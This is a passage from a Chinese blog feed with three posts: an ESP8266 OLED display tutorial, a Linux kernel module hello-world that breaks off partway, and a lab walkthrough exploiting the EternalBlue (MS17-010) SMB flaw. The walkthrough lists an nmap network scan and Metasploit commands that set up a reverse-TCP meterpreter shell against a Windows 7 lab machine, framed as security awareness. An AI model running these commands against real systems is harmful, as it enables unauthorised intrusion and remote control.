      <content type="html"><![CDATA[<blockquote><p>摘要：本文主要介绍了如何搭建以Visual Studio Code 和 PlatformIO为基础的单片机开发环境，并以esp8266开发板为例，通过在OLED显示屏上显示文字的一个例子介绍如何开发一个单片机程序。</p></blockquote><p>本文主要使用的环境：</p><blockquote><p>单片机开发板:Esp8266(CH340G)</p><p>Visual Studio Code：1.45.1</p><p>PlatformIO：Core  4.3.4   Home  3.2.2</p><p>U8g2：2.28.6</p></blockquote><h4 id="一、硬件部分"><a href="#一、硬件部分" class="headerlink" title="一、硬件部分"></a>一、硬件部分</h4><p>首先就是去某宝买一个esp8266开发板和显示屏，这里我买的是这个（不贴链接，不然有打广告嫌疑，自己去搜哈，有些卖家不送杜邦线的，可以提前问问）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/10007.png" alt="image-20200609001347090"></p><p>按照卖家的说明将显示屏和开发板连接好</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/100002354.png" alt="image-20200609001656314"></p><h4 id="二、软件部分"><a href="#二、软件部分" class="headerlink" title="二、软件部分"></a>二、软件部分</h4><h5 id="1-安装Visual-Studio-Code-和-PlatformIO"><a href="#1-安装Visual-Studio-Code-和-PlatformIO" class="headerlink" title="1. 安装Visual Studio Code 和 PlatformIO"></a>1. 安装Visual Studio Code 和 PlatformIO</h5><p>vscode: <a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p>安装完成vscode启动，扩展页面下搜索platformio即可找到,选择第一个Platformio IDE，安装即可（这里需要耐心等待一会）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/4363463.png" alt="image-20200609004134896"></p><p>安装完成，等待vscode重新加载后，左下角会多一个小房子图标，点击后即可显示Platformio IDE主界面</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/4363463456t.png" alt="image-20200608225407247"></p><h5 id="2-安装显示库"><a href="#2-安装显示库" class="headerlink" title="2.安装显示库"></a>2.安装显示库</h5><p>如图点击主界面右侧侧边栏Libraies选项卡，然后直接搜索U8G2然后点击进去，里面有个安装按钮，点一下即可：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/54y7457.png" alt="image-20200608230257339"></p><h5 id="3-开始我们的第一个程序"><a href="#3-开始我们的第一个程序" class="headerlink" title="3. 开始我们的第一个程序"></a>3. 开始我们的第一个程序</h5><p>   选择新建工程:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/5475476574767.png" alt="image-20200608225916996"></p><p>​    </p><pre><code>选择板子类型和框架然后点完成，这里我的设置如下图：</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/135424.png" alt="image-20200608225858345"></p><pre><code>然后即可在main.cpp编辑你的代码：</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/1537453.png" alt="image-20200608230108817"></p><p>这里我们输入如下代码</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Arduino.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;U8g2lib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bmp_x 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bmp_y 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSD1306_SDA 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSD1306_SLK 4</span></span><br><span class="line"><span class="function">U8G2_SSD1306_128X64_NONAME_F_SW_I2C <span class="title">u8g2</span><span class="params">(U8G2_R0, SSD1306_SLK, SSD1306_SDA)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line">  u8g<span class="number">2.</span><span class="built_in">begin</span>();</span><br><span class="line">  u8g<span class="number">2.</span><span class="built_in">enableUTF8Print</span>();<span class="comment">// 打开utf-8支持</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span>{</span><br><span class="line"> u8g<span class="number">2.</span><span class="built_in">setFont</span>(u8g2_font_wqy12_t_gb2312);  <span class="comment">// 设置字体</span></span><br><span class="line">  </span><br><span class="line">  u8g<span class="number">2.</span><span class="built_in">setFontDirection</span>(<span class="number">0</span>);</span><br><span class="line">  u8g<span class="number">2.f</span>irstPage();</span><br><span class="line">  <span class="keyword">do</span> {</span><br><span class="line">    u8g<span class="number">2.</span><span class="built_in">setCursor</span>(<span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">    u8g<span class="number">2.</span><span class="built_in">print</span>(<span class="string">"中国"</span>);</span><br><span class="line">    u8g<span class="number">2.</span><span class="built_in">drawUTF8</span>(<span class="number">0</span>,<span class="number">40</span>,<span class="string">"我爱你"</span>);</span><br><span class="line">    </span><br><span class="line">  } <span class="keyword">while</span> ( u8g<span class="number">2.</span><span class="built_in">nextPage</span>() );</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>代码解释：</p><p>(1).void setup() 函数里的内容启动时会执行一次以后不再执行，一般用于初始化。void loop()函数里的内容将会在机器通电时循环执行，一般用于干正事。</p><p>(2).u8g2.begin()：U8g2的构造函数。可以理解为初始化。</p><p>(3).5、6、7行与你的显示屏有关</p><blockquote><p>具体参见：</p><p><a href="https://blog.csdn.net/weixin_30510153/article/details/96227475">https://blog.csdn.net/weixin_30510153/article/details/96227475</a><br><a href="https://github.com/olikraus/u8g2/wiki/gallery">https://github.com/olikraus/u8g2/wiki/gallery</a></p></blockquote><p>(4).u8g2.setFontDirection()，用于设置方向 可选参数:0123</p><p>(5).u8g2.firstPage()/nextPage()：循环刷新显示，保持这样就好，把你要输出的内容放在这里面就行。</p><p>(6).u8g2.setCursor(x, y) 设置打印功能的光标位置，也就是设置你在上绘制图形或文字的起始位置。</p><p>(7).delay(1000)会使单片机延迟1000个时钟周期也就是暂停一段时间啥也不干留给显示屏处理数据，设置太短会来不及写到屏幕上。</p><h5 id="4-连接板子到电脑，然后编译并刷写到板子上"><a href="#4-连接板子到电脑，然后编译并刷写到板子上" class="headerlink" title="4.连接板子到电脑，然后编译并刷写到板子上"></a>4.连接板子到电脑，然后编译并刷写到板子上</h5><p>如下图，可以先点编译再点旁边的上传，也可以直接点上传</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/4535.png" alt="image-20200609000955186"></p><p>当你看到下图时，说明刷写成功了，没成功的仔细检查一下设备连线，还有就是看看你的代码，显示屏设置对不对。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/10254.png" alt="image-20200609001057699"></p><h4 id="三、成果展示"><a href="#三、成果展示" class="headerlink" title="三、成果展示"></a>三、成果展示</h4><p>刷写成功后，OLED显示屏应该可以成功显示出我们设置的内容了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/23513/45374583783.png" alt="image-20200609002205245"></p><blockquote><p>附其他U8G2库常用函数</p><p>1.指令</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">clearDisplay</span>();    <span class="comment">// 清除显示数据及屏幕</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">clearBuffer</span>();    <span class="comment">// 清Buffer缓冲区的数据</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">sendBuffer</span>();    <span class="comment">// 将Buffer帧缓冲区的内容发送到显示器,发送刷新消息</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">sendF</span>(<span class="string">"c"</span>, <span class="number">0x0a7</span>);    <span class="comment">// 向显示控制器发送特殊命令</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setPowerSave</span>(<span class="number">0</span>)    <span class="comment">// 开关省电模式</span></span><br></pre></td></tr></tbody></table></figure><p>2.设置</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">enableUTF8Print</span>();    <span class="comment">//设置启用UTF-8支持</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">disableUTF8Print</span>();    <span class="comment">//设置停用UTF-8支持</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setContrast</span>();    <span class="comment">//设置显示屏亮度/对比度(0-255)</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setBusClock</span>();    <span class="comment">//设置连接速度(IIC:200000-400000/SPI:1000000-8000000),在begin()之前调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置字体</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFontMode</span>(<span class="number">0</span>);    <span class="comment">//定义字体背景模式,仅u8g2_xxx_tX字体支持,默认0,禁用透明</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFontDirection</span>(<span class="number">0</span>); <span class="comment">//旋转当前显示 参数:0123</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFont</span>(u8g2_font_unifont_t_chinese1);    <span class="comment">//设置字体</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFontPosCenter</span>();    <span class="comment">//设置字体基线Center/Baseline/Bottom/Top</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置颜色</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setDrawColor</span>(<span class="number">1</span>); <span class="comment">//设置颜色,0透显,1实显,2XOR (drawCircle,drawDisc,drawEllipse和drawFilledEllipse不支持XOR模式)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置光标位置</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">home</span>();    <span class="comment">//设置光标回初始位置</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setCursor</span>(x, y); <span class="comment">//设置打印功能的光标位置</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setBitmapMode</span>(<span class="number">0</span>);    <span class="comment">//设置是否开启位图函数背景色</span></span><br></pre></td></tr></tbody></table></figure><p>3.简单绘制</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">drawStr</span>(x, y, <span class="string">"文本"</span>); <span class="comment">// 绘制文本字符,不能绘制编码大于或等于256,绘制文本前需定义字体.y轴向上绘制</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawUTF8</span>(x, y,<span class="string">"字符"</span>);    <span class="comment">// 绘制一个编码为UTF-8的字符串.注意1.编译器支持2.代码编辑器支持</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawGlyph</span>(x, y, HEX);    <span class="comment">// 绘制特殊文本图标(需联合特殊字体)</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">print</span>();    <span class="comment">// 打印文本字符(需要联合光标位置setCursor,setFont)支持变量和F()</span></span><br></pre></td></tr></tbody></table></figure><p>4.高级绘制</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">drawPixel</span>(x, y); <span class="comment">// 在xy位置绘制一个像素.</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawHLine</span>(x, y, w); <span class="comment">// 绘制水平线 w长度</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawVLine</span>(x, y, h);    <span class="comment">// 绘制垂直线 h高度</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawLine</span>(x1, y1, x2, y2);    <span class="comment">// 画自由线 x1y1点1 x2y2点2</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawBox</span>(x, y, w, h); <span class="comment">// 绘制矩形，画填充矩形w,h,宽度,高度 2 u8g2.drawFrame(x, y, w, h); // 画空心矩形w,h,宽度,高度</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawRFrame</span>(x,y,w,h,r); <span class="comment">//绘制圆角矩形，要求w &gt;= 2*(r+1);h &gt;= 2*(r+1);否则未定义2*(r+1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正或椭圆</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawCircle</span>(圆心x, 圆心y, 半径rad, 部分位置U8G2_DRAW_ALL);    <span class="comment">// 画空心圆 rad半径 直径为 2rad+1</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawEllipse</span>(圆心x, 圆心y, 椭圆长度x, 椭圆宽度y, 部分位置U8G2_DRAW_ALL)    <span class="comment">//画空心椭圆 长度和宽度均为整个圆的1/2</span></span><br><span class="line">U8G2_DRAW_ALL    <span class="comment">/*替换参数:</span></span><br><span class="line"><span class="comment">U8G2_DRAW_ALL 全部</span></span><br><span class="line"><span class="comment">U8G2_DRAW_UPPER_RIGHT 上右</span></span><br><span class="line"><span class="comment">U8G2_DRAW_UPPER_LEFT 上左</span></span><br><span class="line"><span class="comment">U8G2_DRAW_LOWER_RIGHT 下右</span></span><br><span class="line"><span class="comment">U8G2_DRAW_LOWER_LEFT 下左*/</span></span><br><span class="line"></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawTriangle</span>(x1,y1,x2,y2,x3,y3); <span class="comment">//绘制多边形，三个点的坐标,实心</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawXBM</span>( x, y, w, h, bits);    <span class="comment">//绘制位图，bits是位图资源表,setBitmapMode(1)切换为旧模式</span></span><br></pre></td></tr></tbody></table></figure></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> esp8266 </tag>
        
            
            
        <tag> 单片机 </tag>
        
            
            
        <tag> vscode </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>永恒之蓝漏洞的简单利用</title>
      
      
      <link href="/cn/posts/29143/"/>
      
      
      <url>/cn/posts/29143/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：</p><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>详见<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">Microsoft 安全公告：MS17-010</a> :<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p><p>恶意代码会扫描开放445文件共享端口的Windows机器，<strong>无需用户任何操作，只要开机上网</strong>，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><p>本文主要利用“永恒之蓝”漏洞（<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">Microsoft 安全公告：MS17-010</a>）对目标靶机进行攻击并拿到远程执行的权限，并通过获取远程靶机上的文件的例子讲解此漏洞的危害，提高大家的安全意识。</p><p><strong>本文为科普性质文章，仅用于学习交流，严禁用于非法用途</strong></p></blockquote><p>实验环境：</p><p>靶机： Windows 7 64 位 专业版 ip:192.168.4.6</p><p>攻击主机： Kali X64 2020.2  ip:192.168.4.3</p><h5 id="1-设置靶机"><a href="#1-设置靶机" class="headerlink" title="1.设置靶机"></a>1.设置靶机</h5><p>我们在靶机的C盘上放置一个文本文件，保存此文件，内容如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/29143/image-20200622204008081.png" alt="win7靶机上存放的文件内容"></p><h5 id="2-开始攻击"><a href="#2-开始攻击" class="headerlink" title="2.开始攻击"></a>2.开始攻击</h5><p>（不想了解攻击过程的可以直接看 3 ）首先扫描一下本网内的有哪些机器可以攻击</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -Pn 192.168.4.0/24</span><br></pre></td></tr></tbody></table></figure><p>如下图可以发现我们成功扫描到了我们的靶机：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/29143/image-20200622204154770.png" alt="扫描结果"></p><p>然后终端打开 msfconsole攻击框架</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/29143/image-20200621213913982.png" alt="启动sfconsole攻击框架"></p><p>设置参数：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.4.3</span><br><span class="line">set rhost 192.168.4.6</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure><p>下图为渗透成功后的界面：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/29143/75867836.png" alt="执行渗透命令"></p><h5 id="3-入侵"><a href="#3-入侵" class="headerlink" title="3.入侵"></a>3.入侵</h5><p>这时候我们已经可以在Win7靶机上执行任意命令了，为了简单起见，这里我们执行一个type命令查看一下刚刚上文保存的的文件，可以看到文件内容已经可以获取，而且在靶机上没有任何提示：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/29143/4536783.png" alt="远程执行命令查看文件"></p><h5 id="4-结语"><a href="#4-结语" class="headerlink" title="4.结语"></a>4.结语</h5><p>通过“永恒之蓝”漏洞，黑客便可远程攻击拥有任何此漏洞的Windows 机器，<strong>无需用户任何操作，只要开机上网（因此不要连接来历不明的WiFi，也许你就刚好暴露在黑客的枪口下）</strong>，不法分子就能在电脑和服务器中<strong>植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</strong></p><p>由此可见，任何没有打补丁的机器都将可能陷入危险之中，所以请不要随意关闭Windows 更新。此外还有很多针对手机的攻击，例如针对安卓的Strandhogg漏洞，包括最新Android10在内的所有Android版本，都存在Strandhogg漏洞。不法攻击者可以利用StrandHogg漏洞，使用BankBot银行木马等恶意软件，悄无声息地盗走用户的银行卡内余额。此外它还能访问你的摄像头和麦克风，获取设备的位置，读取短信，访问你的私人照片和视频，访问联系人……只要成功利用Strandhogg漏洞，攻击者可以随意获取上述信息。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
            
        <tag> kali </tag>
        
            
            
        <tag> linux </tag>
        
            
            
        <tag> exploit </tag>
        
            
            
        <tag> 渗透 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>编写我的第一个Linux 内核模块“hello_module</title>
      
      
      <link href="/cn/posts/19043/"/>
      
      
      <url>/cn/posts/19043/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p> 前言：</p><p> Linux 内 核 模 块 全 称 为 “ 动 态 可 加 载 内 核 模 块 (Loadable Kernel Module,LKM)”，是系统内核向外部提供的功能插口。作为宏内核结构，Linux 内核具有效率高的特点，但也有可扩展性和可维护性相对较差的不足，Linux 提供模块机制正是弥补这一缺陷。</p><p> 模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。模块在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程是不同的。模块通常有一组函数和数据结构组成，用来实现某种文件系统、驱动程序或其它内核上层功能。 </p><p> 本文将介绍如何编写一个简单的内核模块以及如何传递参数给此模块。 </p></blockquote><h4 id="一、-编写一个简单的内核模块"><a href="#一、-编写一个简单的内核模块" class="headerlink" title="一、 编写一个简单的内核模块"></a>一、 编写一个简单的内核模块</h4><h5 id="1-编写模块程序"><a href="#1-编写模块程序" class="headerlink" title="1.编写模块程序"></a>1.编写模块程序</h5><p>编写如下简单代码，本示例中代码文件命名“hello_module.c”。 </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello_module.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   printk(<span class="string">"This is hello_module, welcome to Linux kernel \n"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   printk(<span class="string">"see you next time!\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Q"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"hello kernel module"</span>);</span><br><span class="line">MODULE_ALIAS(<span class="string">"hello"</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码解释如下:</p><p>（1） #include &lt;linux/module.h&gt;：必须。module.h 头文件包含了对模块的结构定义以及模块的版本控制，任何模块程序的编写都要包含这个头文件；</p><p>（2） #include &lt;linux/kernel.h&gt;：kernel.h 包含了常用的内核函数，如以上程序中的 printk()函数；</p><p>（3） #include &lt;linux/init.h&gt;：必须。init.h 包含了 module_init()和 module_exit()函数的声明；</p><p>（4） module_init()：必须。模块加载函数，加载模块式该函数自动执行，进行初始化操作；</p><p>（5） module_exit()：必须。模块卸载函数，卸载模块时函数自动执行，进行清理操作；</p><p>（6） MODULE_LICENSE():表示模块代码接受的软件许可协议。Linux 内核是使用 GPL V2 的开源项目，其要求所有使用和修改了 Linux 内核代码的个人或组织都有义务把修改后的源代码公开，这是一个强制的开源协议，所以一般编写驱动代码都需要显示的声明和遵循本协议，否则内核 UI 发出被污染的警告；</p><p>（7） MODULE_AUTHOR():描述模块的作者信息；</p><p>（8） MODULE_DESCRIPTION():简单描述模块的用途、功能介绍等；</p><p>（9） MODULE_ALIAS():为用户控件提供的别名；</p><p>（10） printk():内核输出函数，默认打印系统文件 “ /var/log/kern.log”的内容。  </p></blockquote><h5 id="2-编译内核模块"><a href="#2-编译内核模块" class="headerlink" title="2. 编译内核模块"></a>2. 编译内核模块</h5><p>编写 Makefile 文件，文件名必须为“Makefile”  </p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello_module.o</span><br><span class="line"></span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码解释如下:</p><p>（1） obj-m := &lt;模块名&gt;.o：定义要生成的模块名称</p><p>（2） KERNELBUILD := /lib/modules/$(shell uname -r)/build ：</p><p>KERNELBUILD 为自定义名称，用于指向正在运行 Linux 的内核编译目录，其中“uname -r”标识显示对应的内核版本；</p><p>（3） CURRENT_PATH := $(shell pwd)：CURRENT_PATH 为自定义名称，用于指向当前当前目录；</p><p>（4） all:编译执行的动作</p><p>（5） clean:zhixing make clean 需要的动作。“make clean”用于清除上次的 make 命令所产生的 object 文件（后缀为“.o”的文件）及可执行文件。    </p></blockquote><h5 id="3-编译"><a href="#3-编译" class="headerlink" title="3.编译"></a>3.编译</h5><p>将以上两个文件(hello_module.c 和 Makefile)保存于同一目录下，将上文中代码存放在路径为“/code/hellomodule/”，编译需在文件保存目录中进行。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvZ1VlVzN0N0lQaWRPMkdyLnBuZw" alt="image-20200608113407988"></p><p>编译成功后，可看到生成的 hello_module.ko 目标文件  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvOXg4MVBSd21pWERZdVFaLnBuZw" alt="image-20200608113502338"></p><h5 id="4-检查编译模块"><a href="#4-检查编译模块" class="headerlink" title="4.检查编译模块"></a>4.检查编译模块</h5><p>可通过 file 命令检查编译的模块是否正确，可以看到 x86-64 架构的 elf文件，说明编译成功:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 